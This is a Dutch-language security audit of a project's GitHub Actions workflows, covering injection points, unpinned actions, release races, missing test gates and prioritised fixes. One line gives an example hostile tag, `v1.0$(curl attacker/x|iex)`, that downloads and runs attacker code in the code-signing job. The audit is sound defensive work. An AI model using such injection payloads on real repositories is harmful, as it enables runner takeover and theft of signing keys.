# Workflow-audit Open Planner Studio — `.github/`

**Inventaris:** 5 workflows (`ci.yml` 74r, `live.yml` 29r, `release.yml` 274r, `snap.yml` 100r, `auto-assign-issues.yml` 19r) + `CODEOWNERS`. **Ontbreekt volledig:** `dependabot.yml`, `SECURITY.md`, issue/PR-templates, en elke vorm van SAST/audit-workflow.

## Overkoepelende bevindingen

**O1 — Script-injectie via tag- en dispatch-input: 6 plaatsen, HOOG.** De ernstigste klasse. Elke `${{ }}` uit een tagnaam of `workflow_dispatch`-input wordt letterlijk in een shellscript geplakt vóór de shell start. Een tagnaam is vrije tekst en iedereen met write-access kan taggen. De getroffen jobs bezitten `TAURI_SIGNING_PRIVATE_KEY`, de Azure-credentials en `SNAPCRAFT_STORE_CREDENTIALS` — pad: "write-access → RCE op de runner → codesigning-sleutel".

| Locatie | Interpolatie | Context |
|---|---|---|
| `release.yml:30` | `github.event.inputs.version` | bash |
| `release.yml:40` | `steps.get-version.outputs.version` | JS (single-quoted, breekt op `'`) |
| `release.yml:158` | `needs.create-release.outputs.version` | **pwsh double-quoted → `$(...)` wordt geëvalueerd** |
| `snap.yml:30` | `github.event.inputs.version` | bash |
| `snap.yml:45` | `steps.get-version.outputs.version` | bash |
| `snap.yml:68` | `...outputs.version_number` | bash **én** `sed`-patroon |

`release.yml:158` is de scherpste: een tag `v1.0$(curl attacker/x|iex)` voert uit in exact de job met de signing-secrets. Fix overal identiek: waarde via `env:` doorgeven + CalVer-`case`-whitelist (`v[0-9]*.[0-9]*.[0-9]*`) die de hele klasse afsluit. Voor `github-script`: `env:` + `process.env` — het patroon dat `publish-release:265` al correct gebruikt.

**O2 — `npm install` in CI en release, `npm ci` in productie-deploy: HOOG.** `ci.yml:45,62`, `release.yml:92,124` vs `live.yml:25`. Gevolgen: (a) CI valideert de lockfile nooit — een out-of-sync lock glipt groen door CI en klapt op de productie-deploy ná merge; (b) gesigneerde installers zijn niet-reproduceerbaar. Vier keer `npm ci`.

**O3 — Geen `concurrency` behalve in `live.yml`: MIDDEL.** ci.yml = verspilling; release.yml/snap.yml = correctheidsrisico bij twee tags kort na elkaar (beide beschrijven `latest.json`/de stable-channel). Voor releases: `cancel-in-progress: false`.

**O4 — Third-party actions op mutable refs, incl. in secret-dragende jobs: MIDDEL/HOOG.**

| Action | Versie | Type | Ziet secrets? |
|---|---|---|---|
| `actions/checkout` | `@v5` | mutable major (first-party) | — |
| `actions/setup-node` | `@v5` | mutable major | — |
| `actions/github-script` | `@v8` | mutable major | `GITHUB_TOKEN` |
| `actions/upload-artifact` | `@v4` | mutable major | — |
| `dtolnay/rust-toolchain` | `@stable` | **branch-ref (rolling)** | ja (signing key in job-env) |
| `tauri-apps/tauri-action` | `@action-v0.6.1` | mutable tag | ja |
| `azure/trusted-signing-action` | `@v0.5.0` | mutable tag, pre-1.0 | ja (alle Azure-secrets) |
| `snapcore/action-build` | `@v1` | mutable major | ja (via job-env) |
| `snapcore/action-publish` | `@v1` | mutable major | ja |

`dtolnay/rust-toolchain@stable` is de slechtste: `stable` is een *branch* — elke commit draait direct mét de signing key in de env. Pin de vijf third-party actions op commit-SHA.

**O5 — Geen `dependabot.yml`: MIDDEL.** Geen updates voor npm/cargo/github-actions. Hangt samen met O4: pin op SHA én laat Dependabot de pins bijwerken.

**O6 — Nergens `timeout-minutes`: LAAG/MIDDEL.** Een hangende job kan 6 uur doorlopen. 45 (builds) / 20 (test) / 75 (snap).

**O7 — Nul caching: MIDDEL (efficiëntie).** Geen `cache: npm`, geen `Swatinem/rust-cache`. De Rust-toolchain compileert bij elke run op 3 OS'en opnieuw. Goedkoopste grote winst: realistisch halvering van de CI-wandkloktijd.

## 1. `ci.yml`

Sterkste workflow; gebreken zitten in hardening/efficiëntie, niet logica.
1. `:1-9` — geen `permissions:`-blok (MIDDEL). Erft de repo-default terwijl `npm install` postinstall-scripts van PR-code draait. → `permissions: {contents: read}`.
2. Geen concurrency (O3).
3. `:45,62` — `npm install` (O2) — precies de job die de lockfile zou moeten bewaken.
4. `:17-19` — inconsistente runner-pinning (LAAG/MIDDEL): `ubuntu-22.04` gepind (vanwege `libappindicator3-dev`, bestaat niet op 24.04), windows/macos `-latest`. Pin alle drie én plan migratie naar `libayatana-appindicator3-dev`.
5. `:34-36` vs `:47-48` — dode stap (LAAG, maar): universal-targets worden geïnstalleerd maar de build gebruikt ze niet. **CI valideert de universal-build dus nooit** — een universal-only fout verschijnt pas midden in een onomkeerbare release.
6. `:13-19` — `matrix.include` met één sleutel (cosmetisch).
7. `:50-74` — dekkingsgaten (MIDDEL): geen Playwright-zelftest, geen `npm audit`, geen CodeQL, geen expliciete `npm run build` in de test-job (webbundel alleen indirect via Tauri-build gedekt).
8. `:68` — bij een compile-fout in een check-bestand toont de CI-log niets (esbuild-output onderdrukt in `run.sh`).
9. CLAUDE.md noemt de hele `test`-job niet.

## 2. `live.yml`

Grootste blast radius, zwakste poort ervoor.
1. **`:18` — reusable workflow op `@main` van een andere repo, mét deploy-SSH-key. HOOG.** Iedereen met write op `OpenAEC-Foundation/github` kan bij de volgende main-push van deze repo de deploysleutel exfiltreren. Pin op SHA/tag.
2. **`:12-14` — `cancel-in-progress: true` op een deploy. MIDDEL/HOOG.** Twee snelle pushes = eerste run midden in de overdracht afgebroken → half-gedeployde site. Deploys horen te wachten: `cancel-in-progress: false`.
3. **`:3-6` — deploy niet gekoppeld aan testresultaat. HOOG.** ci.yml en live.yml draaien parallel; een commit met rode planningssuite deployt gewoon naar productie. → `workflow_run`-trigger op CI met success-gate, of de testcommando's herhalen vóór de deploy.
4. `:20-22` — ongevalideerde `vars.*` (LAAG/MIDDEL): lege strings bij ontbreken.
5. `:23` — hardcoded pad (LAAG).
6. Geen path-filter (elke README-commit deployt; let op dat `public/docs/**` wél mee moet).

## 3. `release.yml`

De pwsh-stap is door schade en schande gehard (comments documenteren drie echte productiestoringen); de omhulling is zwak.
1. **`:52-101` — read-modify-write-race op `latest.json` tussen de parallelle Linux- en macOS-leg. HOOG.** `includeUpdaterJson: true` doet per leg download → merge → upload zonder lock; wie het laatst uploadt overschrijft de ander. De Windows-job is wél geserialiseerd (comment `:132-134`) — het gevaar was bekend, de oplossing half doorgevoerd. Intermitterend (macOS meestal langzamer); symptoom: één platform verliest zijn updater-entry en krijgt nooit meer updates. Fix: `max-parallel: 1`.
2. **`:158` — pwsh-injectie in de signing-job. HOOG** (zie O1).
3. **`:66-68, 108-110` — signing-secrets als job-level `env`. HOOG.** In scope van elke stap, incl. `npm install` (postinstall-scripts!). Verplaats naar de twee stappen die ze nodig hebben.
4. `:199` — private key als commandline-argument (MIDDEL): staat in de procestabel; de CLI leest hem ook uit de env — vlaggen weglaten.
5. **`:268-274` — `updateRelease()` niet ge-`await`d. HOOG.** Job kan groen worden terwijl de release draft blijft; afwijzing verdwijnt als unhandled rejection. → `await` + `Number(process.env.release_id)`.
6. `:152-252` — native exitcodes in pwsh (MIDDEL): zet `$PSNativeCommandUseErrorActionPreference = $true`, anders kan `npx tauri signer sign` of `gh release upload` stil falen in de stap die updater-artefacten bouwt.
7. **`:3-6` — geen enkele poort vóór een onomkeerbare release. HOOG.** Geen tsc, geen suite, geen verify:*, geen needs op CI. → gate-job met exact de vier commando's; `create-release` needs de gate.
8. `:3-6` — geen branch-restrictie op de tag (MIDDEL): een `v*`-tag op elke commit maakt een gesigneerde publieke release. → `git merge-base --is-ancestor "$GITHUB_SHA" origin/main` in de gate.
9. **Geen verificatie tag ↔ package.json/tauri.conf.json. HOOG.** Tag zonder bump = release die "slaagt" maar geen enkele gebruiker bereikt (updater vergelijkt gelijke versies). → versievergelijking in de gate.
10. `:35-50` — niet-idempotent bij re-run (MIDDEL): tweede draft voor dezelfde tag. → eerst `getReleaseByTag`, hergebruik id.
11. `:56-63,103` — gedeeltelijk falen niet afgehandeld (MIDDEL): draft met incomplete assetset blijft achter; draftstatus beschermt de updater gelukkig wél. → `if: failure()`-opruimjob of documenteren.
12. `:44-46` — hardcoded generieke release-body (MIDDEL): CHANGELOG.md wordt niet gebruikt; de skill patcht handmatig ná publicatie — venster met generieke updater-tekst + handbewerkte `latest.json` (het bestand dat al drie keer kapot is geweest). → releaseBody uit CHANGELOG extraheren.
13. `:8-12` — dispatch-default `'v0.1.0'` (LAAG): bogus release bij onbedoelde dispatch; veld is al required — default weg.
14. `:20` — `outputs.result` is JSON-encoded (LAAG): werkt toevallig voor een getal; maak expliciet.
15. `:18,257` vs `:60` — runner-inconsistentie (LAAG).
16. `:30,32` — `>> $GITHUB_OUTPUT` ongequote; snap.yml quotet wél (inconsistentie).
17. `:104` — de bewuste serialisatie-`needs` mist een comment (MIDDEL): wie hem "optimaliseert" breekt de updater.
18. `:171` — geen Windows arm64 (informatief).

## 4. `snap.yml`

Herverpakt de release-`.deb` (goede keuze, gedocumenteerd); de coördinatie via polling is de bron van de meeste bevindingen.
1. **`:93-100` — publiceert naar Snap Store `stable` vóór de GitHub-release gepubliceerd is. HOOG.** Volgorde: draft + deb → snap bouwt en publiceert naar stable → pas daarna `publish-release`. Faalt Windows/Azure/publish alsnog, dan staat er een versie live in de Snap Store die op GitHub nooit is uitgekomen — en een Snap-release is niet in te trekken. → `workflow_run` op "Build and Release" met success-gate (lost ook 2 en 3 op).
2. `:41-64` — 30 minuten pollen met `sleep` (MIDDEL): gefactureerde runnertijd + harde bovengrens; een trage Linux-build laat snap onterecht falen.
3. `:49` — poll wacht op het *bestaan* van de asset, niet op een geslaagde build.
4. **`:30,45,68,81` — injectie via versie-string. HOOG** (O1); `:68` het scherpst: waarde gaat door shell én `sed`-vervangingspatroon.
5. `:19-21` — `SNAPCRAFT_STORE_CREDENTIALS` als job-level env (MIDDEL): in scope van checkout/download/sed/action-build. → step-output `has_creds` + secret alleen op de publish-stap.
6. `:95-100` — direct naar `stable` zonder rooktest (MIDDEL): overweeg `candidate` + promotiestap; de snapcraft-comment geeft zelf toe dat ontbrekende libs pas bij de verificatierun blijken.
7. `:62` — `ls` parsen (LAAG): gebruik een glob-array.
8. `:44,80` — geen `set -euo pipefail` (expliciete intentie ontbreekt; `-o pipefail` staat niet aan).
9. `:8-12` — dispatch-default `v2026.6.0` verouderd (LAAG).
10. Geen concurrency/timeout (O3/O6) — met een pollinglus het relevantst hier.
11. `:66-69` — `sed -i` netjes beperkt en geverifieerd, maar de `grep` faalt de stap niet bij nul vervangingen → `grep -q ... || exit 1`.

## 5. `auto-assign-issues.yml`

Veruit de best-gehardende workflow: expliciete minimale `permissions`, correct `await`, geen interpolatie van gebruikersdata. Gebruik als referentiepatroon.
1. **`:18` vs `CODEOWNERS:1-2` — twee verschillende eigenaars (MIDDEL):** workflow wijst `DutchSailor` toe; CODEOWNERS zegt `@Nozzit`; de release-skill spreekt over "Nozzit's account". Twee accounts van één persoon (nergens vastgelegd) óf één is verouderd. → één bron (bijv. `vars.PRODUCT_OWNER`).
2. `:14-19` — stille no-op bij een niet-toewijsbare gebruiker (LAAG): `addAssignees` negeert assignees zonder schrijfrechten geruisloos; verifieer de respons.
3. `:11` — `github-script@v8` mutable (O4, risico laag).

## Prioriteitsvolgorde

1. **`release.yml:52-63`** — `max-parallel: 1`. Eén regel, dicht een intermitterende bug die stilletjes een platform van auto-updates afsnijdt.
2. **`release.yml:268`** — `await`. Eén woord, voorkomt een groene run die niets publiceert.
3. **O1 (6 plaatsen)** — versie via `env` + CalVer-whitelist. Sluit de injectieklasse, beschermt de signing-sleutel.
4. **Versie-consistentiepoort + testpoort vóór `create-release`** — voorkomt de twee stilste release-faalmodi.
5. **`live.yml:18` op SHA pinnen + `cancel-in-progress: false`** — deploysleutel en integriteit van de live site.
6. **`snap.yml` omhangen aan `workflow_run`** — lost store-race, 30-minutenlus en polling-timeout tegelijk op.
7. **O2 (`npm ci`) en O7 (caching)** — reproduceerbaarheid en ± halvering CI-tijd voor ~10 regels YAML.
